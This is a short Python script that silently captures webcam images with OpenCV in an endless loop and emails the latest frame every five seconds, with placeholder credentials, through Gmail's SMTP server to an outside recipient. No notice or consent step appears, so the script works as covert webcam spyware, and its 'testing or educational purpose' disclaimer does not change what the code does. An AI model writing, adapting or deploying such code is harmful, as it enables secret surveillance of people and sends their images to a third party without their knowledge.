import cv2
import time
import smtplib
import imghdr
from email.message import EmailMessage


cap = cv2.VideoCapture(0)
while True:
    for i in range(0, 100):
        ret, image = cap.read()
        cv2.imwrite("pic.jpg", image)
    time.sleep(5)


    Sender_Email = "<sender mail>"
    Reciever_Email = "<reciever mail>"
    Password = "<sender password>"
    newMessage = EmailMessage()
    newMessage['Subject'] = "Webcam image"
    newMessage['From'] = Sender_Email
    newMessage['To'] = Reciever_Email
    newMessage.set_content('Use it for testing or educational purpose ! ')
    with open('pic.jpg', 'rb') as f:
        image_data = f.read()
        image_type = imghdr.what(f.name)
        image_name = f.name
    newMessage.add_attachment(image_data, maintype='image', subtype=image_type, filename=image_name)
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(Sender_Email, Password)
        smtp.send_message(newMessage)
cap.release()
cv2.destroyAllWindows()
